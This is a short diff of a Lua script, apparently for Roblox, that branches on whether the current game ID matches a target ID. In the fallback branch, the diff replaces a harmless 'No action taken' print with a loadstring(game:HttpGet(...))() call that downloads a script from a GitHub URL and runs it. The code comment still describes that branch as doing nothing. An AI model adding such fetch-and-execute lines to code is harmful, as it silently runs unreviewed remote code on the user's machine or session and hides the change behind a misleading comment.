@@ -19,5 +19,5 @@ if currentGameId == targetGameId then
     performAction()
 else
     -- If the game ID does not match, do something else or nothing
-    print("The Game ID does not match. No action taken.")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/t1hub2/Brub/refs/heads/main/Game%20detector.lua"))()
 end
